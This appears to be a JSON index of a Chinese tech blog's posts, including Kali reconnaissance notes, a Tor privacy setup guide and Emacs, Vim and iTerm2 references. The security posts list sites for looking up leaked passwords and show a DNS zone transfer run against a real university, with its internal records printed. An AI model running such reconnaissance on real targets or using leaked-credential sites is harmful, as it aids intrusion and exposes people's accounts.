(it was worth a shot)Okay, trying the good old fashioned way... brute forceChecking for wildcard DNS...Nope. Good.Now performing 2280 test(s)...\n应用字典\nroot@kali:~# fierce -dns dbstye.net -wordlist myWordlist.txt\n\n社工库部分需翻墙\n\nhttp://www.xiumima.com/\n\nhttp://cha.hxsec.com/\n\nhttp://findmima.com\n\nhttp://163.donothackme.club/\n\nhttp://www.rallyindonesia.com/\n\n\n","categories":[],"tags":["Hack"]},{"title":"Kali系列——信息收集阶段（一）","url":"http://www.yfgeek.com/2016/07/30/Kali系列——信息收集阶段（一）/","content":"记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：\n\n进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探\n\n\n爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！\n\n其实，我觉得渗透测试无论怎么变，不外乎这几点：\n\n信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段\n\n最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。\n \n信息收集阶段DNS信息其实DNS信息收集阶段用两个Linux系统自带工具即可完成。\nnslookup此命令，可以快速查处ip地址\n ✘ ivan@Ivan~ nslookup zhihu.comServer:\t\t114.114.114.114Address:\t114.114.114.114#53Non-authoritative answer:Name:\tzhihu.comAddress: 54.223.189.245\n\n当然也可以指定dns查询服务器：\nivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8Server:\t\t8.8.8.8Address:\t8.8.8.8#53Non-authoritative answer:zhihu.com\tnameserver = ns3.dnsv4.com.zhihu.com\tnameserver = ns4.dnsv4.com.Authoritative answers can be found from:\ndigdig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：\nivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns.csust.edu.cn csust.edu.cn axfr; (1 server found);; global options: +cmdcsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400csust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.csust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.csust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18csust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.csust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.csust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c0083g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6app.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11app7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227app8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8archives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232bid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.bw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20cas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1cslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80cslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.cslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.cwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252cxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203dkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200dlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.dns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400;; Query time: 62 msec;; SERVER: 210.43.192.8#53(210.43.192.8);; WHEN: Sat Jul 30 20:18:47 2016;; XFR size: 112 records (messages 1, bytes 2369)\n可以看到，各种信息，从A、cname到MX全部暴露无遗。如果不存在该漏洞则会被服务器拒绝查询请求。\nivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns4.tju.edu.cn tju.edu.cn axfr; (1 server found);; global options: +cmd; Transfer failed.\n\nwhoiswhois查询，不多解释了\nivan@Ivan ~ whois yfgeek.comWhois Server Version 2.0Domain names in the .com and .net domains can now be registeredwith many different competing registrars. Go to http://www.internic.netfor detailed information.   Domain Name: YFGEEK.COM   Registrar: GODADDY.COM, LLC   Sponsoring Registrar IANA ID: 146   Whois Server: whois.godaddy.com   Referral URL: http://www.godaddy.com   Name Server: F1G1NS1.DNSPOD.NET   Name Server: F1G1NS2.DNSPOD.NET   Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited   Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited   Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited   Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited   Updated Date: 21-apr-2016   Creation Date: 23-nov-2012   Expiration Date: 23-nov-2017\n","categories":[],"tags":["Hack"]},{"title":"Emacs 命令大全","url":"http://www.yfgeek.com/2016/07/29/Emacs-命令大全/","content":"emacs命令是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n \n# 语法emacs(选项)(参数)\n#选项+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。\n\n#参数文件：指定要编辑的文本文件。\n\n#emacs命令操作大全基本命令\nC-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令\n\n编辑\nC-z (redefined): Undo；原来C-z是挂起Emacs（然后用[fg](http://man.linuxde.net/fg \"fg命令\")命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语\n\n移动光标\nC-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央\n\nBuffer 相关\nC-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-[w](http://man.linuxde.net/w \"w命令\") : 文件另存为\n\n拷贝与粘贴\nM-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴\n窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作\n\n搜索和替换\nC-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换\n\nTags\nM-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags\n\n书签\nC-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处\n\n帮助\nC-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的[info](http://man.linuxde.net/info \"info命令\")，非常有用\nC-h i : 看Info\n\n其它\nC-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性\n","categories":[],"tags":["Linux"]},{"title":"Tor安全上网指南","url":"http://www.yfgeek.com/2016/07/28/Tor安全上网指南/","content":"本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。\n \n声明！\n==本文原创，技术无罪，笔者即将身处海外，本文撰写目的仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途。==\n==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，不允许任何形式私自转载，本文只进行对TOR相关技术探讨，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==\n准备条件\n\n1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。\n\n2.最新版Vidalia 下载地址（需完整互联网）\n\n3.Vmware Fusion/Vmware workstation/Oracle VirtualBox\n\n4.一个完整版的虚拟机操作系统\n\n\n笔者环境\n操作系统：OS X EI Capitan 10.11.5\n虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)\n虚拟机操作系统：Windows xp sp2 或 Kali linux\n隧道软件：lantern 或 shadowsockets\nVidalia部分如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。1.建立您的隧道网络\n笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。\n2.在Vidalia中设置代理连接\n打开Vidalia-设置-网络：我使用代理服务器连接网络\n地址：127.0.0.1 端口：1080（用户定义）\n类型：SOCKS 5\n3.继续设置，转发出外网端口\nVidalia-设置-高级-编辑当前torrc：确认socksport为9050，也可以定义为其他端口。同时添加SocksListenAddress 0.0.0.0:9050到底部保存\n笔者配置文件如下，仅供参考，不可复制：\n# This file was generated by Tor; if you edit it, comments will not be preserved# The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore itControlPort 9051DataDirectory /Users/ivan/.torDirReqStatistics 0HashedControlPassword 16:此处隐藏Socks5Proxy 127.0.0.1:1080Log notice stdoutSocksListenAddress 0.0.0.0:9050SocksPort 9050\n\n\n4.Vidalia启动TOR\n稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。\nVmware部分1.设置Vmware，添加虚拟网卡\n进入Vmware的偏好设置-网络，先点小锁，把功能解锁。\n然后点+，新建一个网络，警告：请勿勾选NAT。\n勾选 将MAC主机连入该网络\n同时设置 通过DHCP在该网络提供网络地址：\n\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n\n\n2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2\n虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。\n虚拟机部分(Win)1.进入操作系统\n建议重新安装操作系统，以保证系统纯净性。\n2.寻找宿主机ip\n经过笔者的简单测试，宿主机ip为172.16.225.1如果实在找不到，可用啊D工具箱或nmap等工具进行查找。\n3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接\n4.安装Proxifier\nProxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。\n5.配置Proxifer\n打开Proxifier-Profile-Proxy Servers，点击Add…\n随后保存并设置而为默认\n6.测试网络\n打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。\n总结为了保证用户隐私的绝对安全，建议做到以下几点：\n\n在虚拟机系统下不要留下任何痕迹：\n虚拟机操作系统系统语言设置为英语，地区为美国。\n虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。\n关机前清除系统隐私记录，养成良好习惯。\n能设置不保留记录的软件均设置如此。\n不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。\n不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。\n将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。\n设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。\n进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。\n\n特别鸣谢\n感谢几年前@safe121提供的无私技术帮助\n","categories":[],"tags":["Hack"]},{"title":"Vim 命令大全","url":"http://www.yfgeek.com/2016/07/28/Vim-命令大全/","content":" \n进入vi的命令\nvi filename :打开或新建文件，并将光标置于第一行首\nvi +n filename ：打开文件，并将光标置于第n行首\nvi + filename ：打开文件，并将光标置于最后一行首\nvi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处\nvi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename\nvi filename….filename ：打开多个文件，依次进行编辑\n移动光标类命令h ：光标左移一个字符\nl ：光标右移一个字符\nspace：光标右移一个字符\nBackspace：光标左移一个字符\nk或Ctrl+p：光标上移一行\nj或Ctrl+n ：光标下移一行\nEnter ：光标下移一行\nw或W ：光标右移一个字至字首\nb或B ：光标左移一个字至字首\ne或E ：光标右移一个字至字尾\n) ：光标移至句尾\n( ：光标移至句首\n}：光标移至段落开头\n{：光标移至段落结尾\nnG：光标移至第n行首\nn+：光标下移n行\nn-：光标上移n行\nn$：光标移至第n行尾\nH ：光标移至屏幕顶行\nM ：光标移至屏幕中间行\nL ：光标移至屏幕最后行\n0：（注意是数字零）光标移至当前行首\n$：光标移至当前行尾\n屏幕翻滚类命令Ctrl+u：向文件首翻半屏\nCtrl+d：向文件尾翻半屏\nCtrl+f：向文件尾翻一屏\nCtrl＋b；向文件首翻一屏\nnz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。\n插入文本类命令i ：在光标前\nI ：在当前行首\na：光标后\nA：在当前行尾\no：在当前行之下新开一行\nO：在当前行之上新开一行\nr：替换当前字符\nR：替换当前字符及其后的字符，直至按ESC键\ns：从当前光标位置处开始，以输入的文本替代指定数目的字符\nS：删除指定数目的行，并以所输入文本代替之\nncw或nCW：修改指定数目的字\nnCC：修改指定数目的行\n删除命令ndw或ndW：删除光标处开始及其后的n-1个字\ndo：删至行首\nd$：删至行尾\nndd：删除当前行及其后n-1行\nx或X：删除一个字符，x删除光标后的，而X删除光标前的\nCtrl+u：删除输入方式下所输入的文本\n搜索及替换命令/pattern：从光标开始处向文件尾搜索pattern\n?pattern：从光标开始处向文件首搜索pattern\nn：在同一方向重复上一次搜索命令\nN：在反方向上重复上一次搜索命令\n：s/p1/p2/g：将当前行中所有p1均用p2替代\n：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代\n：g/p1/s//p2/g：将文件中所有p1均用p2替换\n选项设置all：列出所有选项设置情况\nterm：设置终端类型\nignorance：在搜索中忽略大小写\nlist：显示制表位(Ctrl+I)和行尾标志（$)\nnumber：显示行号\nreport：显示由面向行的命令修改过的数目\nterse：显示简短的警告信息\nwarn：在转到别的文件时若没保存当前文件则显示NO write信息\nnomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符\nnowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始\nmesg：允许vi显示其他用户用write写到自己终端上的信息\n最后行方式命令：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下\n：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下\n：n1,n2 d ：将n1行到n2行之间的内容删除\n：w ：保存当前文件\n：e filename：打开文件filename进行编辑\n：x：保存当前文件并退出\n：q：退出vi\n：q!：不保存文件并退出vi\n：!command：执行shell命令command\n：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入\n：r!command：将命令command的输出结果放到当前行\n寄存器操作“?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字\n“?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字\n“?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字\n“?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字\nndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。\n","categories":[],"tags":["Linux"]},{"title":"iTerm2 美化全过程","url":"http://www.yfgeek.com/2016/07/28/iTerm2-美化全过程/","content":"本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。\n1.首先下载 iTerm 22.打开iTerm 23.输入下面指令安装oh-my-zshcurl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh\n4.接下来安装Powerline在官网有教程，我们只需要执行官网第一条安装指令就行如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装\npip install powerline-status\n如果没有，则先执行安装pip指令\nsudo easy_install pip\n5.下载、安装库字体库1）将工程下载下来后cd到install.sh文件所在目录2）执行指令安装字体库\n执行./install.sh指令安装所有Powerline字体\n安装完成后提示所有字体均已下载到/Users/superdanny/Library/Fonts路径下All Powerline fonts installed to /Users/superdanny/Library/Fonts\n6. 设置iTerm 2的Regular Font 和 Non-ASCII Font安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline\n7. 配色方案1）安装配色方案进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里\n2）配置配色方案通过load presets选择刚刚安装的配色主题即可\n8. 使用agnoster主题1）下载agnoster主题到下载的工程里面运行install文件,主题将安装到~/.oh-my-zsh/themes目录下\n2）设置该主题进入~/.zshrc打开.zshrc文件，然后将ZSH_THEME后面的字段改为agnoster。ZSH_THEME=&quot;agnoster&quot;（agnoster即为要设置的主题）\n9. 增加指令高亮效果——zsh-syntax-highlighting指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮\n1）cd到.zshrc所在目录\n2）执行指令将工程克隆到当前目录\ngit clone git://github.com/zsh-users/zsh-syntax-highlighting.git\n3）打开.zshrc文件，在最后添加下面内容\nsource XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\n保存文件。\n注意：xxx代表.zshrc所在目录\n4）cd ~/.oh-my-zsh/custom/plugins\n5）再次打开.zshrc文件，在最后面添加下面内容plugins=(zsh-syntax-highlighting)保存文件。\n启动iTerm 2 默认使用dash改用zsh解决方法：chsh -s /bin/zsh\nVim$ cd solarized $ cd vim-colors-solarized/colors $ mkdir -p ~/.vim/colors $ cp solarized.vim ~/.vim/colors/ $ vi ~/.vimrc syntax enable set background=dark colorscheme solarized\nlsMac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（brew install coreutils），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：\n$ vi ~/.bash_profile export CLICOLOR=1\n","categories":[],"tags":["Mac"]},{"title":"恭喜你，你已经翻到底了，然而...","url":"http://www.yfgeek.com/2016/06/10/恭喜你，你已经翻到底了，然而/","content":"事情远没有你想象的那么简单。我是一凡，一个小极客，十年前开始写博客，你所看到这是最后一篇，仅仅是因为，尘封太久的黑历史懒得搬家，我把他们都整理好了，并且放到了GitHub上。\n博客曾经从百度空间搬迁到独立VPS再搬迁到云服务再搬迁到Ghost再搬迁到Hexo，今天，我不想搬家了。\n如果你有兴趣…欢迎进来参观：\nhttps://github.com/yfgeek/Blog\n黑历史太多，如果你觉得，为什么过去那么幼稚，技术如此简单？\n其实不是我幼稚，只是，那是十年前。\n十年前的博客，都是这个文风。\n不要惊叹，不要鄙视，如果你十年前写过博客，你会理解我的。\n至于你所看到“落后”的技术，在十年前，也是“先进”的技术，时间，改变的太多了。\n欢迎留言！\n","categories":[],"tags":[]}]